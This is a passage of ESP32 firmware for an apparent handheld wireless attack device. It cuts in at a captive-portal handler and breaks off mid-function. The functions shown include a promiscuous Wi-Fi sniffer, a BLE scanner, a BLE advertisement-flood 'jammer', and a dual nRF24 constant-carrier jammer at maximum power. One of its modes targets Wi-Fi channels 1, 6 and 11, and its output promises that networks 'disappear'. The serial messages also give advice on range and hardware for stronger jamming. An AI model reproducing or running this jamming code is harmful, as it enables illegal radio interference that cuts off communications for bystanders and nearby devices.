  webServer.send(200, "text/html", html);
  
  // Log connection attempt
  Serial.printf("[*] Portal page served to: %s\n", webServer.client().remoteIP().toString().c_str());
}

// ==================== Sniffer Functions ====================

void startSniffer() {
  snifferActive = true;
  packetCount = 0;
  beaconCount = 0;
  dataCount = 0;
  deauthCount = 0;
  snifferChannel = 1;
  
  WiFi.disconnect();
  WiFi.mode(WIFI_STA);
  delay(100);
  
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&wifiSnifferCallback);
  esp_wifi_set_channel(snifferChannel, WIFI_SECOND_CHAN_NONE);
  
  currentState = SNIFFER_ACTIVE;
  addToConsole("Sniffer started - Fast hop");
  
  Serial.println("[+] Sniffer started with fast channel hopping");
  Serial.println("    Hopping through channels 1-13 at 200ms intervals");
  
  displaySnifferActive();
}

void stopSniffer() {
  snifferActive = false;
  esp_wifi_set_promiscuous(false);
  addToConsole("Sniffer stopped");
  
  Serial.printf("[+] Sniffer stopped - %d packets captured\n", packetCount);
}

void displaySnifferActive() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("wifi frame sniffer");
  
  // Live indicator
  static bool blink = false;
  blink = !blink;
  tft.fillCircle(220, 12, 3, blink ? COLOR_RED : COLOR_DARK_GREEN);
  
  // Stats bar - COMPACT single line
  int statsY = HEADER_HEIGHT + 5;
  tft.setTextSize(1);
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN, statsY);
  tft.printf("Ch%d", snifferChannel);
  
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(55, statsY);
  tft.printf("T:%d", packetCount);
  
  tft.setTextColor(COLOR_GREEN);
  tft.setCursor(95, statsY);
  tft.printf("B:%d", beaconCount);
  
  tft.setTextColor(COLOR_YELLOW);
  tft.setCursor(135, statsY);
  tft.printf("D:%d", dataCount);
  
  tft.setTextColor(COLOR_RED);
  tft.setCursor(175, statsY);
  tft.printf("X:%d", deauthCount);
  
  // Column headers
  int listY = HEADER_HEIGHT + 22;
  tft.drawFastHLine(0, listY - 3, 240, COLOR_DARK_GREEN);
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, listY);
  tft.print("TYPE");
  tft.setCursor(40, listY);
  tft.print("RSSI");
  tft.setCursor(75, listY);
  tft.print("CH");
  tft.setCursor(100, listY);
  tft.print("AGE");
  
  tft.drawFastHLine(0, listY + 12, 240, COLOR_DARK_GREEN);
  listY += 15;

  const int MAX_DISPLAY = 12;
  int totalPackets = min((uint32_t)MAX_SNIFFER_PACKETS, packetCount);
  
  if (totalPackets == 0) {
    tft.setTextSize(1);
    tft.setTextColor(COLOR_TEXT);
    tft.setCursor(SIDE_MARGIN, listY + 60);
    tft.print("Waiting for packets...");
    tft.setCursor(SIDE_MARGIN, listY + 75);
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.print("Fast channel hopping...");
  } else {
    // Display last N packets (newest at bottom, auto-scroll up)
    int startIdx = max(0, totalPackets - MAX_DISPLAY);
    int displayCount = min(MAX_DISPLAY, totalPackets);
    
    for (int i = 0; i < displayCount; i++) {
      int idx = (packetHistoryIndex - totalPackets + startIdx + i + MAX_SNIFFER_PACKETS) % MAX_SNIFFER_PACKETS;
      
      if (packetHistory[idx].timestamp == 0) continue;
      
      int y = listY + (i * 22);
      
      // Type with color coding
      uint16_t typeColor = COLOR_TEXT;
      const char* typeName = "UNK";
      
      if (packetHistory[idx].type == 0x80) {
        typeColor = COLOR_GREEN;
        typeName = "BCN";
      } else if ((packetHistory[idx].type & 0x0C) == 0x08) {
        typeColor = COLOR_CYAN;
        typeName = "DAT";
      } else if (packetHistory[idx].type == 0xC0 || packetHistory[idx].type == 0xA0) {
        typeColor = COLOR_RED;
        typeName = "DEA";
      } else if (packetHistory[idx].type == 0x40) {
        typeColor = COLOR_PURPLE;
        typeName = "PRB";
      }
      
      tft.setTextColor(typeColor);
      tft.setTextSize(1);
      tft.setCursor(SIDE_MARGIN, y+4);
      tft.print(typeName);
      
      // RSSI
      int rssi = packetHistory[idx].rssi;
      uint16_t rssiColor = (rssi > -50) ? COLOR_GREEN : (rssi > -70) ? COLOR_YELLOW : COLOR_RED;
      
      tft.setTextColor(rssiColor);
      tft.setCursor(40, y+4);
      tft.printf("%3d", rssi);
      
      // Channel
      tft.setTextColor(COLOR_CYAN);
      tft.setCursor(75, y+4);
      tft.printf("%2d", packetHistory[idx].channel);
      
      // Time ago
      unsigned long ago = (millis() - packetHistory[idx].timestamp) / 1000;
      tft.setTextColor(COLOR_TEXT);
      tft.setCursor(100, y+4);
      if (ago < 60) {
        tft.printf("%2ds", ago);
      } else if (ago < 3600) {
        tft.printf("%2dm", ago / 60);
      } else {
        tft.printf("%2dh", ago / 3600);
      }
    }
  }
  
  // ✅ LEGEND - Right side, aligned properly
  int legendY = listY + 60;
  int legendX = 160;
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(legendX, legendY);
  tft.print("LEGEND:");
  
  legendY += 16;
  tft.setTextColor(COLOR_GREEN);
  tft.setCursor(legendX, legendY);
  tft.print("B");
  tft.setTextColor(COLOR_TEXT);
  tft.print("=Beacon");
  
  legendY += 12;
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(legendX, legendY);
  tft.print("D");
  tft.setTextColor(COLOR_TEXT);
  tft.print("=Data");
  
  legendY += 12;
  tft.setTextColor(COLOR_RED);
  tft.setCursor(legendX, legendY);
  tft.print("X");
  tft.setTextColor(COLOR_TEXT);
  tft.print("=Deauth");
  
  legendY += 12;
  tft.setTextColor(COLOR_PURPLE);
  tft.setCursor(legendX, legendY);
  tft.print("P");
  tft.setTextColor(COLOR_TEXT);
  tft.print("=Probe");
  
  legendY += 12;
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(legendX, legendY);
  tft.print("T=Total");

  legendY += 30;
  tft.setTextColor(COLOR_RED);
  tft.setCursor(legendX -15, legendY);
  tft.print("Tap anywhere");

  legendY += 12;
  tft.setTextColor(COLOR_RED);
  tft.setCursor(legendX, legendY);
  tft.print("To stop");
}


// ==================== BLE Functions ====================

void scanBLEDevices() {
  Serial.println("\n========== STARTING BLE SCAN ==========");
  
  // ✅ FIX: Pause nRF24
  bool wasNRFActive = nrfJammerActive;
  if (nrfJammerActive) {
    Serial.println("[*] Pausing nRF24 for BLE scan...");
    nrfJammerActive = false;
    delay(100);
  }
  
  // Clean up any previous BLE operations
  if (bleJammerActive || appleSpamActive || androidSpamActive) {
    if (BLEDevice::getInitialized()) {
      BLEDevice::deinit(true);
      delay(200);
    }
  } else if (BLEDevice::getInitialized()) {
    BLEDevice::deinit(true);
    delay(200);
  }
  
  addToConsole("BLE continuous scan started");
  
  BLEDevice::init("");
  pBLEScan = BLEDevice::getScan();
  pBLEScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks());
  pBLEScan->setActiveScan(true);
  pBLEScan->setInterval(100);
  pBLEScan->setWindow(99);
  
  continuousBLEScan = true;
  
  displayBLEScanResults();
  
  pBLEScan->start(0, nullptr, false);
  
  Serial.println("[+] BLE scan started");
  Serial.println("=====================================\n");
}

void displayBLEScanResults() {
  currentState = BLE_SCAN_RESULTS;
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("ble scan");
  
  // Live indicator
  static bool blink = false;
  blink = !blink;
  tft.fillCircle(220, 12, 3, blink ? COLOR_GREEN : COLOR_DARK_GREEN);
  
  // Stats bar - COMPACT single line
  int statsY = HEADER_HEIGHT + 5;
  tft.setTextSize(1);
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(SIDE_MARGIN, statsY);
  tft.print("Scanning...");
  
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(120, statsY);
  tft.printf("Found: ");
  tft.setTextColor(COLOR_GREEN);
  tft.printf("%d", bleDeviceCount);
  
  // Column headers
  int listY = HEADER_HEIGHT + 22;
  tft.drawFastHLine(0, listY - 3, 240, COLOR_DARK_GREEN);
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, listY);
  tft.print("NAME");
  tft.setCursor(140, listY);
  tft.print("RSSI");
  
  tft.drawFastHLine(0, listY + 12, 240, COLOR_DARK_GREEN);
  listY += 15;
  
  // Calculate safe display area
  const int BACK_BUTTON_Y = 305;
  const int SAFE_BOTTOM = BACK_BUTTON_Y - 25;
  const int ITEM_HEIGHT = 26;
  const int MAX_ITEMS = (SAFE_BOTTOM - listY) / ITEM_HEIGHT;
  
  // Ensure scroll offset is valid
  if (bleScrollOffset >= bleDeviceCount) {
    bleScrollOffset = max(0, bleDeviceCount - MAX_ITEMS);
  }
  if (bleScrollOffset < 0) {
    bleScrollOffset = 0;
  }
  
  int displayCount = min(bleDeviceCount - bleScrollOffset, MAX_ITEMS);
  
  for (int i = 0; i < displayCount; i++) {
    int idx = bleScrollOffset + i;
    int y = listY + (i * ITEM_HEIGHT);
    
    // Stop if too close to back button
    if (y + ITEM_HEIGHT > SAFE_BOTTOM) break;
    
    // Name
    String displayName = bleDevices[idx].name;
    if (displayName.length() == 0) displayName = "Unknown";
    if (displayName.length() > 18) displayName = displayName.substring(0, 17) + "~";
    
    tft.setTextColor(COLOR_TEXT);
    tft.setTextSize(1);
    tft.setCursor(SIDE_MARGIN, y + 2);
    tft.print(displayName);
    
    // Address
    tft.setTextColor(COLOR_CYAN);
    tft.setCursor(SIDE_MARGIN, y + 12);
    String addr = bleDevices[idx].address;
    if (addr.length() > 17) addr = addr.substring(0, 17);
    tft.print(addr);
    
    // RSSI
    int rssi = bleDevices[idx].rssi;
    tft.setTextColor(rssi > -50 ? COLOR_GREEN : rssi > -70 ? COLOR_YELLOW : COLOR_RED);
    tft.setCursor(140, y + 7);
    tft.printf("%d", rssi);
  }
  
  // Scroll indicator (if needed)
  if (bleDeviceCount > MAX_ITEMS) {
  int scrollY = SAFE_BOTTOM + 2;
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setTextSize(1);
  
  int currentPage = (bleScrollOffset / MAX_ITEMS) + 1;
  int totalPages = (bleDeviceCount + MAX_ITEMS - 1) / MAX_ITEMS;
  char scrollText[30];
  sprintf(scrollText, "Page %d/%d [Tap scroll]", currentPage, totalPages);
  int textWidth = strlen(scrollText) * 6;
  int centerX = (240 - textWidth) / 2;
  
  tft.setCursor(centerX, scrollY);
  tft.print(scrollText);
  }
  
  drawCenteredButton("[STOP]", COLOR_RED);
}

// ==================== BLE JAMMER Functions ====================
void initBLEJammer() {
  // Pre-build advertisement spam packet
  memset(adv_spam_packet, 0, sizeof(adv_spam_packet));
  adv_spam_packet[0] = 0x02; // Length
  adv_spam_packet[1] = 0x01; // Flags type
  adv_spam_packet[2] = 0x06; // LE General Discoverable
  
  // Pre-build disconnect packet (LL_TERMINATE_IND)
  memset(disconnect_packet, 0, sizeof(disconnect_packet));
  disconnect_packet[0] = 0x02; // LL Control PDU
  disconnect_packet[1] = 0x13; // Reason: Remote user terminated
  
  // Pre-build connection flood packet
  memset(connect_flood_packet, 0, sizeof(connect_flood_packet));
  connect_flood_packet[0] = 0x05; // CONNECT_IND
}

void forceResetBluetooth() {
  Serial.println("[*] Force resetting Bluetooth stack...");
  
  // Step 1: Stop advertising if active
  if (BLEDevice::getInitialized()) {
    esp_ble_gap_stop_advertising();
    delay(50);
  }
  
  // Step 2: Deinit BLEDevice completely
  if (BLEDevice::getInitialized()) {
    BLEDevice::deinit(true);
    delay(200);
  }
  
  // Step 3: Force disable Bluedroid
  for (int attempt = 0; attempt < 3; attempt++) {
    esp_bluedroid_status_t bd_status = esp_bluedroid_get_status();
    Serial.printf("  Bluedroid status: %d\n", bd_status);
    
    if (bd_status == ESP_BLUEDROID_STATUS_ENABLED) {
      esp_err_t ret = esp_bluedroid_disable();
      Serial.printf("  Bluedroid disable: %d\n", ret);
      delay(100);
    } else if (bd_status == ESP_BLUEDROID_STATUS_INITIALIZED) {
      esp_err_t ret = esp_bluedroid_deinit();
      Serial.printf("  Bluedroid deinit: %d\n", ret);
      delay(100);
    } else {
      break; // Already uninitialized
    }
  }
  
  // Step 4: Force disable BT controller
  for (int attempt = 0; attempt < 3; attempt++) {
    esp_bt_controller_status_t status = esp_bt_controller_get_status();
    Serial.printf("  BT controller status: %d\n", status);
    
    if (status == ESP_BT_CONTROLLER_STATUS_ENABLED) {
      esp_err_t ret = esp_bt_controller_disable();
      Serial.printf("  BT controller disable: %d\n", ret);
      delay(100);
    } else if (status == ESP_BT_CONTROLLER_STATUS_INITED) {
      esp_err_t ret = esp_bt_controller_deinit();
      Serial.printf("  BT controller deinit: %d\n", ret);
      delay(100);
    } else {
      break; // Already idle
    }
  }
  
  delay(300); // Final settling time
  Serial.println("[+] Bluetooth stack reset complete");
}

void startBLEJammer() {
  if (bleJammerActive) return;
  
  Serial.println("\n========== STARTING BLE JAMMER ==========");
  
  // ✅ FIX: Pause nRF24 to avoid SPI conflicts
  bool wasNRFActive = nrfJammerActive;
  if (nrfJammerActive) {
    Serial.println("[*] Pausing nRF24 for BLE...");
    nrfJammerActive = false;  // Just stop the loop, keep carrier on
    delay(100);
  }
  
  // Stop any conflicting operations
  if (continuousBLEScan) {
    continuousBLEScan = false;
    if (pBLEScan != nullptr) {
      pBLEScan->stop();
      delay(100);
    }
  }
  
  // Clean up using Arduino BLE library
  if (BLEDevice::getInitialized()) {
    Serial.println("[*] Deinitializing existing BLE...");
    BLEDevice::deinit(true);
    delay(300);
  }
  
  // Initialize using Arduino BLE library
  Serial.println("[*] Initializing BLE for jammer...");
  BLEDevice::init("P4WNC4K3_JAM");
  
  // Get advertising handle
  pAdvertising = BLEDevice::getAdvertising();
  
  if (pAdvertising == nullptr) {
    Serial.println("[!] Failed to get advertising handle");
    addToConsole("BLE jam start failed!");
    
    // ✅ FIX: Resume nRF24 if it was active
    if (wasNRFActive) {
      delay(100);
      nrfJammerActive = true;
      Serial.println("[*] Resumed nRF24 jammer");
    }
    return;
  }
  
  pAdvertising->setMinInterval(100);
  pAdvertising->setMaxInterval(200);
  
  initBLEJammer();
  
  bleJammerActive = true;
  bleJamPackets = 0;
  bleDisconnectsSent = 0;
  bleConnectFloodSent = 0;
  lastBLEJamTime = millis();
  current_ble_channel = 0;
  
  currentState = BLE_JAM_ACTIVE;
  
  Serial.println("[+] BLE Jammer started (STABLE MODE)");
  Serial.println("========================================\n");
  addToConsole("BLE jammer: STABLE");
  
  displayBLEJammerActive();
}

void stopBLEJammer() {
  if (!bleJammerActive) return;
  
  bleJammerActive = false;
  
  Serial.println("\n[*] Stopping BLE jammer...");
  
  // Stop advertising FIRST
  if (pAdvertising != nullptr) {
    pAdvertising->stop();
    delay(100);
  }
  
  // Clean shutdown using Arduino library
  if (BLEDevice::getInitialized()) {
    BLEDevice::deinit(true);
    delay(200);
  }
  
  Serial.printf("\n[+] BLE Jammer stopped\n");
  Serial.printf("    Discovery spam packets: %d\n", bleJamPackets);
  
  addToConsole("BLE jammer stopped");
}

void performBLEJam() {
  if (nrfJammerActive) {
    Serial.println("[!] ERROR: Cannot run BLE while nRF24 is active (SPI conflict)");
    stopBLEJammer();
    return;
  }
  
  if (!bleJammerActive || pAdvertising == nullptr) return;
  
  static unsigned long lastJamCycle = 0;
  static bool advertisingActive = false;
  static uint8_t cyclePhase = 0;
  
  // CRITICAL: Slow down the cycle to prevent watchdog
  // Update every 50ms instead of 2ms (25x slower = stable)
  if (millis() - lastJamCycle < 50) return;
  lastJamCycle = millis();
  
  // Feed watchdog to prevent timeout
  esp_task_wdt_reset();
  
  // Phase 0: Update advertisement data
  if (cyclePhase == 0) {
    // Stop previous advertising
    if (advertisingActive) {
      pAdvertising->stop();
      advertisingActive = false;
      delay(10);  // CRITICAL: Give BLE stack time to cleanup
    }
    
    // Create new advertisement data
    BLEAdvertisementData advertisementData;
    
    // Random device name
    String randomName = "";
    for (int i = 0; i < 10; i++) {
      randomName += char('A' + random(0, 26));
    }
    advertisementData.setName(randomName.c_str());
    
    // Random manufacturer data
    uint8_t mfgData[12];
    for (int i = 0; i < 12; i++) {
      mfgData[i] = random(0, 256);
    }
    advertisementData.setManufacturerData(std::string((char*)mfgData, 12));
    
    // Set data (don't start yet)
    pAdvertising->setAdvertisementData(advertisementData);
    
    cyclePhase = 1;
  }
  // Phase 1: Start advertising
  else if (cyclePhase == 1) {
    pAdvertising->start();
    advertisingActive = true;
    bleJamPackets++;
    
    cyclePhase = 2;
  }
  // Phase 2: Let it advertise for a bit
  else if (cyclePhase == 2) {
    // Keep advertising for 2 cycles (100ms)
    cyclePhase = 3;
  }
  // Phase 3: Prepare for next cycle
  else {
    cyclePhase = 0;  // Back to start
  }
  
  // Small yield to let other tasks run
  yield();
}

void performBLEJam_Continuous() {
  if (!bleJammerActive || pAdvertising == nullptr) return;
  
  static unsigned long lastUpdate = 0;
  static bool isAdvertising = false;
  
  // Update advertisement data every 200ms
  if (millis() - lastUpdate < 200) return;
  lastUpdate = millis();
  
  // Feed watchdog
  esp_task_wdt_reset();
  
  // If not advertising yet, start it
  if (!isAdvertising) {
    pAdvertising->start();
    isAdvertising = true;
    bleJamPackets++;
  }
  
  // Change advertisement data WITHOUT stopping
  // This is more stable - advertising continues in background
  BLEAdvertisementData advertisementData;
  
  // Random device name
  String randomName = "";
  for (int i = 0; i < 10; i++) {
    randomName += char('A' + random(0, 26));
  }
  advertisementData.setName(randomName.c_str());
  
  // Random manufacturer data
  uint8_t mfgData[12];
  for (int i = 0; i < 12; i++) {
    mfgData[i] = random(0, 256);
  }
  advertisementData.setManufacturerData(std::string((char*)mfgData, 12));
  
  // Update while advertising (more stable)
  pAdvertising->setAdvertisementData(advertisementData);
  bleJamPackets++;
  
  // Small yield
  yield();
}

void displayBLEJammerActive() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("ble jammer");
  
  // Live indicator
  static bool blink = false;
  blink = !blink;
  tft.fillCircle(220, 12, 3, blink ? COLOR_GREEN : COLOR_DARK_GREEN);
  
  int y = HEADER_HEIGHT + 15;
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("[*] Status: ");
  tft.setTextColor(COLOR_ORANGE);
  tft.println("JAMMING ACTIVE");
  
  y += 20;
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("[*] Mode: ");
  tft.setTextColor(COLOR_GREEN);
  tft.println(jammerModeText);
  
  y += 20;
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("[*] Packets sent: ");
  tft.setTextColor(COLOR_CYAN);
  tft.printf("%d", bleJamPackets);
  
  y += 20;
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("[*] Duration: ");
  tft.setTextColor(COLOR_TEXT);
  tft.printf("%d sec", (millis() - lastBLEJamTime) / 1000);
  
  y += 30;
  tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
  
  y += 10;
  tft.setTextSize(1);
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(30, y);
  tft.print("Flooding BLE spectrum with");
  
  y += 12;
  tft.setCursor(30, y);
  tft.print("random advertisements...");
  
  drawCenteredButton("[ESC]", COLOR_RED);
}

void updateBLEJammerDisplay() {
  static unsigned long lastUpdate = 0;
  if (millis() - lastUpdate < 500) return;
  lastUpdate = millis();
  // Clear only the stats area to prevent flicker
  int statsY = HEADER_HEIGHT + 35;
  tft.fillRect(SIDE_MARGIN, statsY, 230, 150, COLOR_BG);
  
  tft.setTextSize(1);
  int y = statsY;
  
  // Mode
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("[*] Mode: ");
  tft.setTextColor(COLOR_GREEN);
  tft.println("AGGRESSIVE");
  
  y += 20;
  
  // Total packets
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("[*] Packets: ");
  tft.setTextColor(COLOR_CYAN);
  tft.printf("%d", bleJamPackets);
  
  unsigned long runtime = (millis() - lastBLEJamTime) / 1000;
  if (runtime > 0) {
    tft.setTextColor(COLOR_GREEN);
    tft.printf(" (%d/s)", bleJamPackets / runtime);
  }
  
  y += 20;
  
  // Disconnects sent
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("[*] Disconnects: ");
  tft.setTextColor(COLOR_ORANGE);
  tft.printf("%d", bleDisconnectsSent);
  
  y += 20;
  
  // Connection floods
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("[*] Conn floods: ");
  tft.setTextColor(COLOR_PURPLE);
  tft.printf("%d", bleConnectFloodSent);
  
  y += 20;
  
  // Current channel
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("[*] Channel: ");
  tft.setTextColor(COLOR_CYAN);
  tft.printf("Ch %d", ble_channels[current_ble_channel]);
  
  y += 20;
  
  // Duration
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("[*] Duration: ");
  tft.setTextColor(COLOR_TEXT);
  tft.printf("%d sec", runtime);
  
  y += 25;
  tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
  y += 10;
  
  // Status message
  tft.setTextColor(COLOR_YELLOW);
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("Jamming BLE spectrum...");
  
  y += 12;
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("Devices may disconnect");
}

// ==================== nRF24 Jammer Functions ====================
void startNRFJammer() {
  if (nrfJammerActive) return;
  
  Serial.println("\n╔═══════════════════════════════════════╗");
  Serial.println("║   nRF24 JAMMER - SMOOCHIEE METHOD    ║");
  Serial.println("╚═══════════════════════════════════════╝");
  
  // ✅ CRITICAL: Stop ALL BLE operations first (SPI conflict!)
  if (bleJammerActive) {
    Serial.println("[!] Stopping BLE jammer...");
    stopBLEJammer();
    delay(200);
  }
  if (appleSpamActive) {
    stopAppleSpam();
    delay(100);
  }
  if (androidSpamActive) {
    stopAndroidSpam();
    delay(100);
  }
  if (continuousBLEScan) {
    continuousBLEScan = false;
    if (pBLEScan != nullptr) {
      pBLEScan->stop();
      delay(100);
    }
  }
  
  // Ensure BLE is completely off
  if (BLEDevice::getInitialized()) {
    Serial.println("[*] Deinitializing BLE...");
    BLEDevice::deinit(true);
    delay(200);
  }
  
  if (!nrf1Available && !nrf2Available) {
    showMessage("No nRF24 modules!", COLOR_WARNING);
    Serial.println("[✗] No nRF24 radios available!");
    return;
  }
  
  Serial.println("\n[*] Starting constant carrier transmission...");
  
  // ✅ CRITICAL FIX: Use Smoochiee's initialization method
  if (nrf1Available) {
    radio1.stopConstCarrier();
    delay(50);
    radio1.setAutoAck(false);
    radio1.stopListening();
    radio1.setRetries(0, 0);
    radio1.setPALevel(RF24_PA_MAX, true);  // ← Note: true parameter!
    radio1.setDataRate(RF24_2MBPS);
    radio1.setCRCLength(RF24_CRC_DISABLED);
    delay(50);
    
    byte initial_ch1 = (nrfJamMode == NRF_WIFI_CLOWN) ? wifi_ch1_sweep[0] : 2;
    radio1.startConstCarrier(RF24_PA_MAX, initial_ch1);
    delay(50);
    Serial.printf("    Radio 1: Carrier ON (Ch %d)\n", initial_ch1);
  }
  
  if (nrf2Available) {
    radio2.stopConstCarrier();
    delay(50);
    radio2.setAutoAck(false);
    radio2.stopListening();
    radio2.setRetries(0, 0);
    radio2.setPALevel(RF24_PA_MAX, true);  // ← Note: true parameter!
    radio2.setDataRate(RF24_2MBPS);
    radio2.setCRCLength(RF24_CRC_DISABLED);
    delay(50);
    
    byte initial_ch2 = (nrfJamMode == NRF_WIFI_CLOWN) ? wifi_ch1_sweep[3] : 45;
    radio2.startConstCarrier(RF24_PA_MAX, initial_ch2);
    delay(50);
    Serial.printf("    Radio 2: Carrier ON (Ch %d)\n", initial_ch2);
  }
  
  // Reset counters and state
  nrfJammerActive = true;
  nrfTurboMode = true;
  nrfJamPackets = 0;
  nrf1Packets = 0;
  nrf2Packets = 0;
  lastNRFJamTime = millis();
  nrfLastStats = 0;
  lastChannelChange = millis();
  
  // ✅ CRITICAL: Reset to Smoochiee's starting positions
  flag_radio1 = 0;
  flag_radio2 = 0;
  nrf_ch1 = 2;    // Radio 1 starts low
  nrf_ch2 = 45;   // Radio 2 starts mid (offset pattern)
  sweep_index_radio1 = 0;
  sweep_index_radio2 = 3;
  wifi_jam_mode = 0;
  
  currentState = NRF_JAM_ACTIVE;
  
  Serial.println("\n╔═══════════════════════════════════════╗");
  Serial.println("║         JAMMING STARTED!              ║");
  Serial.println("╚═══════════════════════════════════════╝");
  Serial.printf("Mode: %s\n", dualNRFMode ? "DUAL (2 radios)" : "SINGLE");
  
  const char* modeName = "";
  switch (nrfJamMode) {
    case NRF_SWEEP:   
      modeName = "SWEEP (Smoochiee)"; 
      Serial.println("Pattern: SWEEP (Smoochiee)");
      Serial.println("⚡ METHOD: Constant Carrier + Channel Hop");
      Serial.println("⚡ Expected: 50K-150K hops/sec");
      break;
    case NRF_RANDOM:  
      modeName = "RANDOM"; 
      Serial.println("Pattern: RANDOM");
      Serial.println("⚡ METHOD: Chaotic hopping");
      Serial.println("⚡ Expected: 30K-100K hops/sec");
      break;
    case NRF_FOCUSED: 
      modeName = "FOCUSED (BLE)"; 
      Serial.println("Pattern: FOCUSED (BLE advertising)");
      Serial.println("⚡ METHOD: BLE channel jamming");
      Serial.println("⚡ Expected: 20K-80K hops/sec");
      break;
    case NRF_WIFI_CLOWN: 
      modeName = "WIFI CLOWN V2"; 
      Serial.println("Pattern: WIFI CLOWN V2 (Ch 1,6,11 @ MAX PWR)");
      Serial.println("⚡ METHOD: Multi-channel sweep + Constant Carrier");
      Serial.println("⚡ Dwell: 20ms per channel (optimal)");
      Serial.println("⚡ Expected: WiFi networks DISAPPEAR");
      break;
  }
  
  Serial.println("\n⚡ TFT FROZEN - Stats to serial!");
  Serial.println("💡 TO STOP: Tap screen or type 'nrfjam'");
  Serial.println("═══════════════════════════════════════\n");
  
  displayNRFJammerActive();
  addToConsole("nRF24: " + String(modeName));
}


void stopNRFJammer() {
  if (!nrfJammerActive) return;
  
  nrfJammerActive = false;
  nrfTurboMode = false;
  Serial.println("\n[*] Stopping nRF24 jammer...");
  
  // ✅ CRITICAL: Stop constant carrier AND reset radios properly
  if (nrf1Available) {
    radio1.stopConstCarrier();
    delay(50);
    radio1.powerDown(); // Ensure clean shutdown
    delay(50);
    radio1.powerUp();   // Reset to normal state
    Serial.println("    Radio 1: Stopped and reset");
  }
  
  if (nrf2Available) {
    radio2.stopConstCarrier();
    delay(50);
    radio2.powerDown(); // Ensure clean shutdown
    delay(50);
    radio2.powerUp();   // Reset to normal state
    Serial.println("    Radio 2: Stopped and reset");
  }
  
  delay(200);  // Let radios fully settle
  
  // Print final statistics
  unsigned long runtime = (millis() - lastNRFJamTime) / 1000;
  if (runtime == 0) runtime = 1;
  
  unsigned long hopsPerSec = nrfJamPackets / runtime;
  
  Serial.println("\n╔════════════════════════════════════════╗");
  Serial.println("║   JAMMING STOPPED - FINAL STATS      ║");
  Serial.println("╚════════════════════════════════════════╝");
  Serial.printf("Total runtime: %lu seconds\n", runtime);
  Serial.printf("Total hops: %lu\n", nrfJamPackets);
  Serial.printf("Average rate: %lu hops/sec\n", hopsPerSec);
  
  if (nrf1Available) {
    Serial.printf("Radio 1: %lu hops\n", nrf1Packets);
  }
  if (nrf2Available) {
    Serial.printf("Radio 2: %lu hops\n", nrf2Packets);
  }
  
  Serial.println("\n📊 PERFORMANCE ANALYSIS:");
  if (hopsPerSec > 100000) {
    Serial.println("✅ EXCELLENT - Peak performance!");
    Serial.println("   Your hardware is working perfectly");
    Serial.println("   Effective range: 10-20m");
  } else if (hopsPerSec > 50000) {
    Serial.println("✅ VERY GOOD - Strong jamming");
    Serial.println("   Effective range: 5-15m");
  } else if (hopsPerSec > 25000) {
    Serial.println("✓ GOOD - Working well");
    Serial.println("   Effective range: 3-10m");
  } else if (hopsPerSec > 10000) {
    Serial.println("⚠️ FAIR - Could be better");
    Serial.println("   Check: PA+LNA modules installed?");
    Serial.println("   Check: Capacitors on each module?");
  } else {
    Serial.println("✗ WEAK - Hardware problem!");
    Serial.println("\n   TROUBLESHOOTING:");
    Serial.println("   1. Using PA+LNA modules? (required!)");
    Serial.println("   2. 10µF-100µF capacitors on EACH?");
    Serial.println("   3. 3.3V stable power supply?");
    Serial.println("   4. Good quality USB cable/charger?");
    Serial.println("   5. Wiring matches pin definitions?");
  }
  Serial.println("═══════════════════════════════════════════\n");
  Serial.println("\n💡 TIP: Tap screen or type 'nrfjam' to stop next time!\n");
  
  addToConsole("nRF24 stopped");
  
  // ✅ CRITICAL: Force full redraw with delay
  delay(300);
  
  // Redraw menu
  if (currentState == NRF_JAM_ACTIVE) {
    currentState = NRF_JAM_MENU;
    tft.fillScreen(COLOR_BG); // Clear screen first
    delay(100);
    drawNRFJammerMenu();
  }
}

void displayNRFJammerActive() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("nrf24 jammer");
  
  // Static message - NO live updates for max speed!
  int y = HEADER_HEIGHT + 20;
  
  tft.setTextSize(2);
  tft.setTextColor(COLOR_ORANGE);
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("JAMMING");
  
  y += 30;
  tft.setTextSize(2);
  tft.setTextColor(COLOR_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
